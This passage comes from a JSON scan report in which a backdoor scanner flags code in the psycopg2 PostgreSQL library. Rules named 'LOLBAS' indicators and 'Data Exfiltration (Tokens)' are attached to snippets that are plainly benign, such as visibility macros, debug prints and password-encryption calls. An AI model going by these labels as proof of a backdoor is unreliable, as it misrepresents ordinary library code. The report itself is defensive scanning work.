            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.h"
                },
                "region": {
                  "startLine": 85,
                  "startColumn": 27,
                  "endLine": 85,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"TimestampFromTicks(ticks) -> new timestamp\\n\\n\" \\\n    \"Build an object holding a timestamp value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_DateFromPy(PyObject *module, PyObject *args);\n#define psyco_DateFromPy_doc \\\n",
                    "rendered": {
                      "text": "    \"TimestampFromTicks(ticks) -> new timestamp\\n\\n\" \\\n    \"Build an object holding a timestamp value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_DateFromPy(PyObject *module, PyObject *args);\n#define psyco_DateFromPy_doc \\\n",
                      "markdown": "`    \"TimestampFromTicks(ticks) -> new timestamp\\n\\n\" \\\n    \"Build an object holding a timestamp value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_DateFromPy(PyObject *module, PyObject *args);\n#define psyco_DateFromPy_doc \\\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.h"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 27,
                  "endLine": 78,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"TimeFromTicks(ticks) -> new time\\n\\n\" \\\n    \"Build an object holding a time value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_TimestampFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimestampFromTicks_doc \\\n",
                    "rendered": {
                      "text": "    \"TimeFromTicks(ticks) -> new time\\n\\n\" \\\n    \"Build an object holding a time value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_TimestampFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimestampFromTicks_doc \\\n",
                      "markdown": "`    \"TimeFromTicks(ticks) -> new time\\n\\n\" \\\n    \"Build an object holding a time value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_TimestampFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimestampFromTicks_doc \\\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.h"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 30,
                  "endLine": 76,
                  "endColumn": 36,
                  "snippet": {
                    "text": "HIDDEN PyObject *psyco_TimeFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimeFromTicks_doc \\\n    \"TimeFromTicks(ticks) -> new time\\n\\n\" \\\n    \"Build an object holding a time value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\n",
                    "rendered": {
                      "text": "HIDDEN PyObject *psyco_TimeFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimeFromTicks_doc \\\n    \"TimeFromTicks(ticks) -> new time\\n\\n\" \\\n    \"Build an object holding a time value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\n",
                      "markdown": "`HIDDEN PyObject *psyco_TimeFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimeFromTicks_doc \\\n    \"TimeFromTicks(ticks) -> new time\\n\\n\" \\\n    \"Build an object holding a time value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.h"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 27,
                  "endLine": 71,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"DateFromTicks(ticks) -> new date\\n\\n\" \\\n    \"Build an object holding a date value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_TimeFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimeFromTicks_doc \\\n",
                    "rendered": {
                      "text": "    \"DateFromTicks(ticks) -> new date\\n\\n\" \\\n    \"Build an object holding a date value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_TimeFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimeFromTicks_doc \\\n",
                      "markdown": "`    \"DateFromTicks(ticks) -> new date\\n\\n\" \\\n    \"Build an object holding a date value from the given ticks value.\\n\\n\" \\\n    \"Ticks are the number of seconds since the epoch; see the documentation \" \\\n    \"of the standard Python time module for details).\"\n\nHIDDEN PyObject *psyco_TimeFromTicks(PyObject *module, PyObject *args);\n#define psyco_TimeFromTicks_doc \\\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.h"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 30,
                  "endLine": 59,
                  "endColumn": 36,
                  "snippet": {
                    "text": "HIDDEN PyObject *psyco_Time(PyObject *module, PyObject *args);\n#define psyco_Time_doc \\\n    \"Time(hour, minutes, seconds, tzinfo=None) -> new time\\n\\n\" \\\n    \"Build an object holding a time value.\"\n\nHIDDEN PyObject *psyco_Timestamp(PyObject *module, PyObject *args);\n#define psyco_Timestamp_doc \\\n",
                    "rendered": {
                      "text": "HIDDEN PyObject *psyco_Time(PyObject *module, PyObject *args);\n#define psyco_Time_doc \\\n    \"Time(hour, minutes, seconds, tzinfo=None) -> new time\\n\\n\" \\\n    \"Build an object holding a time value.\"\n\nHIDDEN PyObject *psyco_Timestamp(PyObject *module, PyObject *args);\n#define psyco_Timestamp_doc \\\n",
                      "markdown": "`HIDDEN PyObject *psyco_Time(PyObject *module, PyObject *args);\n#define psyco_Time_doc \\\n    \"Time(hour, minutes, seconds, tzinfo=None) -> new time\\n\\n\" \\\n    \"Build an object holding a time value.\"\n\nHIDDEN PyObject *psyco_Timestamp(PyObject *module, PyObject *args);\n#define psyco_Timestamp_doc \\\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/replication_connection_type.c"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 38,
                  "endLine": 128,
                  "endColumn": 42,
                  "snippet": {
                    "text": "replicationConnection_repr(replicationConnectionObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationConnection object at %p; dsn: '%s', closed: %ld>\",\n        self, self->conn.dsn, self->conn.closed);\n}\n\n",
                    "rendered": {
                      "text": "replicationConnection_repr(replicationConnectionObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationConnection object at %p; dsn: '%s', closed: %ld>\",\n        self, self->conn.dsn, self->conn.closed);\n}\n\n",
                      "markdown": "`replicationConnection_repr(replicationConnectionObject *self)\n{\n    return PyString_FromFormat(\n        \"<ReplicationConnection object at %p; dsn: '%s', closed: %ld>\",\n        self, self->conn.dsn, self->conn.closed);\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/lobject_type.c"
                },
                "region": {
                  "startLine": 424,
                  "startColumn": 24,
                  "endLine": 424,
                  "endColumn": 28,
                  "snippet": {
                    "text": "lobject_repr(lobjectObject *self)\n{\n    return PyString_FromFormat(\n        \"<lobject object at %p; closed: %d>\", self, lobject_is_closed(self));\n}\n\n\n",
                    "rendered": {
                      "text": "lobject_repr(lobjectObject *self)\n{\n    return PyString_FromFormat(\n        \"<lobject object at %p; closed: %d>\", self, lobject_is_closed(self));\n}\n\n\n",
                      "markdown": "`lobject_repr(lobjectObject *self)\n{\n    return PyString_FromFormat(\n        \"<lobject object at %p; closed: %d>\", self, lobject_is_closed(self));\n}\n\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/lobject_type.c"
                },
                "region": {
                  "startLine": 388,
                  "startColumn": 52,
                  "endLine": 388,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    Py_CLEAR(self->conn);\n    PyMem_Free(self->smode);\n\n    Dprintf(\"lobject_dealloc: deleted lobject object at %p, refcnt = \"\n            FORMAT_CODE_PY_SSIZE_T, obj, Py_REFCNT(obj));\n\n    Py_TYPE(obj)->tp_free(obj);\n",
                    "rendered": {
                      "text": "    Py_CLEAR(self->conn);\n    PyMem_Free(self->smode);\n\n    Dprintf(\"lobject_dealloc: deleted lobject object at %p, refcnt = \"\n            FORMAT_CODE_PY_SSIZE_T, obj, Py_REFCNT(obj));\n\n    Py_TYPE(obj)->tp_free(obj);\n",
                      "markdown": "`    Py_CLEAR(self->conn);\n    PyMem_Free(self->smode);\n\n    Dprintf(\"lobject_dealloc: deleted lobject object at %p, refcnt = \"\n            FORMAT_CODE_PY_SSIZE_T, obj, Py_REFCNT(obj));\n\n    Py_TYPE(obj)->tp_free(obj);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/lobject_type.c"
                },
                "region": {
                  "startLine": 370,
                  "startColumn": 46,
                  "endLine": 370,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    if (0 != lobject_open(self, conn, oid, smode, new_oid, new_file))\n        return -1;\n\n   Dprintf(\"lobject_setup: good lobject object at %p, refcnt = \"\n           FORMAT_CODE_PY_SSIZE_T, self, Py_REFCNT(self));\n   Dprintf(\"lobject_setup:    oid = %u, fd = %d\", self->oid, self->fd);\n   return 0;\n",
                    "rendered": {
                      "text": "    if (0 != lobject_open(self, conn, oid, smode, new_oid, new_file))\n        return -1;\n\n   Dprintf(\"lobject_setup: good lobject object at %p, refcnt = \"\n           FORMAT_CODE_PY_SSIZE_T, self, Py_REFCNT(self));\n   Dprintf(\"lobject_setup:    oid = %u, fd = %d\", self->oid, self->fd);\n   return 0;\n",
                      "markdown": "`    if (0 != lobject_open(self, conn, oid, smode, new_oid, new_file))\n        return -1;\n\n   Dprintf(\"lobject_setup: good lobject object at %p, refcnt = \"\n           FORMAT_CODE_PY_SSIZE_T, self, Py_REFCNT(self));\n   Dprintf(\"lobject_setup:    oid = %u, fd = %d\", self->oid, self->fd);\n   return 0;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/lobject_type.c"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 47,
                  "endLine": 352,
                  "endColumn": 51,
                  "snippet": {
                    "text": "lobject_setup(lobjectObject *self, connectionObject *conn,\n              Oid oid, const char *smode, Oid new_oid, const char *new_file)\n{\n    Dprintf(\"lobject_setup: init lobject object at %p\", self);\n\n    if (conn->autocommit) {\n        psyco_set_error(ProgrammingError, NULL,\n",
                    "rendered": {
                      "text": "lobject_setup(lobjectObject *self, connectionObject *conn,\n              Oid oid, const char *smode, Oid new_oid, const char *new_file)\n{\n    Dprintf(\"lobject_setup: init lobject object at %p\", self);\n\n    if (conn->autocommit) {\n        psyco_set_error(ProgrammingError, NULL,\n",
                      "markdown": "`lobject_setup(lobjectObject *self, connectionObject *conn,\n              Oid oid, const char *smode, Oid new_oid, const char *new_file)\n{\n    Dprintf(\"lobject_setup: init lobject object at %p\", self);\n\n    if (conn->autocommit) {\n        psyco_set_error(ProgrammingError, NULL,\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/lobject_type.c"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 22,
                  "endLine": 117,
                  "endColumn": 26,
                  "snippet": {
                    "text": "/* read method - read data from the lobject */\n\n#define psyco_lobj_read_doc \\\n\"read(size=-1) -- Read at most size bytes or to the end of the large object.\"\n\nstatic PyObject *\npsyco_lobj_read(lobjectObject *self, PyObject *args)\n",
                    "rendered": {
                      "text": "/* read method - read data from the lobject */\n\n#define psyco_lobj_read_doc \\\n\"read(size=-1) -- Read at most size bytes or to the end of the large object.\"\n\nstatic PyObject *\npsyco_lobj_read(lobjectObject *self, PyObject *args)\n",
                      "markdown": "`/* read method - read data from the lobject */\n\n#define psyco_lobj_read_doc \\\n\"read(size=-1) -- Read at most size bytes or to the end of the large object.\"\n\nstatic PyObject *\npsyco_lobj_read(lobjectObject *self, PyObject *args)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/lobject_type.c"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 50,
                  "endLine": 56,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        && !self->conn->autocommit\n        && self->conn->mark == self->mark)\n    {\n        Dprintf(\"psyco_lobj_close: closing lobject at %p\", self);\n        if (lobject_close(self) < 0)\n            return NULL;\n    }\n",
                    "rendered": {
                      "text": "        && !self->conn->autocommit\n        && self->conn->mark == self->mark)\n    {\n        Dprintf(\"psyco_lobj_close: closing lobject at %p\", self);\n        if (lobject_close(self) < 0)\n            return NULL;\n    }\n",
                      "markdown": "`        && !self->conn->autocommit\n        && self->conn->mark == self->mark)\n    {\n        Dprintf(\"psyco_lobj_close: closing lobject at %p\", self);\n        if (lobject_close(self) < 0)\n            return NULL;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 967,
                  "startColumn": 41,
                  "endLine": 967,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n};\n",
                    "rendered": {
                      "text": "    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n};\n",
                      "markdown": "`    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n};\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 966,
                  "startColumn": 46,
                  "endLine": 966,
                  "endColumn": 54,
                  "snippet": {
                    "text": "     METH_O, psyco_set_wait_callback_doc},\n    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n",
                    "rendered": {
                      "text": "     METH_O, psyco_set_wait_callback_doc},\n    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n",
                      "markdown": "`     METH_O, psyco_set_wait_callback_doc},\n    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 966,
                  "startColumn": 14,
                  "endLine": 966,
                  "endColumn": 22,
                  "snippet": {
                    "text": "     METH_O, psyco_set_wait_callback_doc},\n    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n",
                    "rendered": {
                      "text": "     METH_O, psyco_set_wait_callback_doc},\n    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n",
                      "markdown": "`     METH_O, psyco_set_wait_callback_doc},\n    {\"get_wait_callback\",  (PyCFunction)psyco_get_wait_callback,\n     METH_NOARGS, psyco_get_wait_callback_doc},\n    {\"encrypt_password\", (PyCFunction)encrypt_password,\n     METH_VARARGS|METH_KEYWORDS, encrypt_password_doc},\n\n    {NULL, NULL, 0, NULL}        /* Sentinel */\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 467,
                  "startColumn": 15,
                  "endLine": 467,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        PQfreemem(encrypted);\n    }\n    Py_XDECREF(user);\n    Py_XDECREF(password);\n    Py_XDECREF(algorithm);\n\n    return res;\n",
                    "rendered": {
                      "text": "        PQfreemem(encrypted);\n    }\n    Py_XDECREF(user);\n    Py_XDECREF(password);\n    Py_XDECREF(algorithm);\n\n    return res;\n",
                      "markdown": "`        PQfreemem(encrypted);\n    }\n    Py_XDECREF(user);\n    Py_XDECREF(password);\n    Py_XDECREF(algorithm);\n\n    return res;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 13,
                  "endLine": 458,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    else {\n        const char *msg = PQerrorMessage(conn->pgconn);\n        PyErr_Format(ProgrammingError,\n            \"password encryption failed: %s\", msg ? msg : \"no reason given\");\n        goto exit;\n    }\n\n",
                    "rendered": {
                      "text": "    else {\n        const char *msg = PQerrorMessage(conn->pgconn);\n        PyErr_Format(ProgrammingError,\n            \"password encryption failed: %s\", msg ? msg : \"no reason given\");\n        goto exit;\n    }\n\n",
                      "markdown": "`    else {\n        const char *msg = PQerrorMessage(conn->pgconn);\n        PyErr_Format(ProgrammingError,\n            \"password encryption failed: %s\", msg ? msg : \"no reason given\");\n        goto exit;\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 13,
                  "endLine": 446,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n        PyErr_SetString(NotSupportedError,\n            \"password encryption (other than 'md5' algorithm)\"\n            \" requires libpq 10\");\n        goto exit;\n#endif\n",
                    "rendered": {
                      "text": "            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n        PyErr_SetString(NotSupportedError,\n            \"password encryption (other than 'md5' algorithm)\"\n            \" requires libpq 10\");\n        goto exit;\n#endif\n",
                      "markdown": "`            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n        PyErr_SetString(NotSupportedError,\n            \"password encryption (other than 'md5' algorithm)\"\n            \" requires libpq 10\");\n        goto exit;\n#endif\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 28,
                  "endLine": 442,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n        /* TODO: algo = None will block: forbid on async/green conn? */\n        encrypted = PQencryptPasswordConn(conn->pgconn,\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user),\n            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n        PyErr_SetString(NotSupportedError,\n",
                    "rendered": {
                      "text": "\n        /* TODO: algo = None will block: forbid on async/green conn? */\n        encrypted = PQencryptPasswordConn(conn->pgconn,\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user),\n            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n        PyErr_SetString(NotSupportedError,\n",
                      "markdown": "`\n        /* TODO: algo = None will block: forbid on async/green conn? */\n        encrypted = PQencryptPasswordConn(conn->pgconn,\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user),\n            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n        PyErr_SetString(NotSupportedError,\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/psycopgmodule.c"
                },
                "region": {
                  "startLine": 441,
                  "startColumn": 29,
                  "endLine": 441,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        }\n\n        /* TODO: algo = None will block: forbid on async/green conn? */\n        encrypted = PQencryptPasswordConn(conn->pgconn,\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user),\n            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n",
                    "rendered": {
                      "text": "        }\n\n        /* TODO: algo = None will block: forbid on async/green conn? */\n        encrypted = PQencryptPasswordConn(conn->pgconn,\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user),\n            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n",
                      "markdown": "`        }\n\n        /* TODO: algo = None will block: forbid on async/green conn? */\n        encrypted = PQencryptPasswordConn(conn->pgconn,\n            Bytes_AS_STRING(password), Bytes_AS_STRING(user),\n            algorithm != Py_None ? Bytes_AS_STRING(algorithm) : NULL);\n#else\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
